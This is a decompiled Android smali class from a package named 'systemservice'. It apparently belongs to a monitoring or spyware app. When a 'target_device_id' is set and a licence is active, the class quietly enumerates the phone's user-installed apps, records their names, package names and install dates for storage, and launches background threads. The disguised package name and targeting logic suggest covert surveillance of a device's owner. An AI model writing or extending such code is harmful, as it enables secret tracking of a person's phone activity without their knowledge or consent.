.class public Lcom/systemservice/a/c/a/c;
.super Ljava/lang/Object;
.source ""


# instance fields
.field private a:Ljava/lang/String;

.field private b:Lcom/systemservice/a/h/c;

.field private c:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "AppManager"

    iput-object v0, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic a(Lcom/systemservice/a/c/a/c;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/a/c;->b(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic b(Lcom/systemservice/a/c/a/c;)Landroid/content/SharedPreferences;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    return-object p0
.end method

.method private b(Landroid/content/Context;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/a/b;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/a/b;-><init>(Lcom/systemservice/a/c/a/c;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic c(Lcom/systemservice/a/c/a/c;)Lcom/systemservice/a/h/c;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/a/c;->b:Lcom/systemservice/a/h/c;

    return-object p0
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 12

    const/4 v0, 0x0

    const-string v1, "app_prefs_settings"

    invoke-virtual {p1, v1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    const-string v2, ""

    const-string v3, "target_device_id"

    invoke-interface {v1, v3, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    const-string v2, "app_install_active"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_4

    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    const-string v2, "license-expired"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    return-void

    :cond_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Lcom/systemservice/a/h/c;

    invoke-direct {v2, p1}, Lcom/systemservice/a/h/c;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/systemservice/a/c/a/c;->b:Lcom/systemservice/a/h/c;

    invoke-virtual {v1, v0}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v2

    iget-object v3, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    const-string v4, "onPostCreate"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v3

    if-lez v3, :cond_4

    const/4 v4, 0x0

    :goto_0
    const/4 v5, 0x1

    if-ge v4, v3, :cond_2

    invoke-interface {v2, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/content/pm/ApplicationInfo;

    iget v7, v6, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/2addr v5, v7

    if-nez v5, :cond_1

    iget-object v5, v6, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v6, v1}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v6

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    const/16 v7, 0x1000

    :try_start_0
    invoke-virtual {v1, v5, v7}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v7

    iget-wide v7, v7, Landroid/content/pm/PackageInfo;->firstInstallTime:J

    new-instance v9, Lcom/systemservice/a/e/b;

    invoke-direct {v9}, Lcom/systemservice/a/e/b;-><init>()V

    invoke-virtual {v9, v6}, Lcom/systemservice/a/e/b;->b(Ljava/lang/String;)V

    invoke-virtual {v9, v5}, Lcom/systemservice/a/e/b;->a(Ljava/lang/String;)V

    const-wide/16 v10, 0x3e8

    div-long v10, v7, v10

    invoke-virtual {v9, v10, v11}, Lcom/systemservice/a/e/b;->a(J)V

    invoke-virtual {v9, v0}, Lcom/systemservice/a/e/b;->a(I)V

    iget-object v5, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v5, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Date: "

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v5, p0, Lcom/systemservice/a/c/a/c;->b:Lcom/systemservice/a/h/c;

    invoke-virtual {v5, v9}, Lcom/systemservice/a/h/c;->a(Lcom/systemservice/a/e/b;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v5

    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    :cond_1
    :goto_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_2
    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->a:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/systemservice/a/c/a/c;->b:Lcom/systemservice/a/h/c;

    const/4 v4, 0x0

    invoke-virtual {v3, v0, v4, v4}, Lcom/systemservice/a/h/c;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, " = size"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->b:Lcom/systemservice/a/h/c;

    invoke-virtual {v1, v0, v4, v4}, Lcom/systemservice/a/h/c;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_4

    iget-object v1, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    const-string v2, "save_battery"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {p1}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/systemservice/a/c/a/c;->c:Landroid/content/SharedPreferences;

    const-string v1, "battery"

    invoke-interface {v0, v1, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/a/c;->b(Landroid/content/Context;)V

    goto :goto_2

    :cond_3
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/a/a;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/a/a;-><init>(Lcom/systemservice/a/c/a/c;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_4
    :goto_2
    return-void
.end method
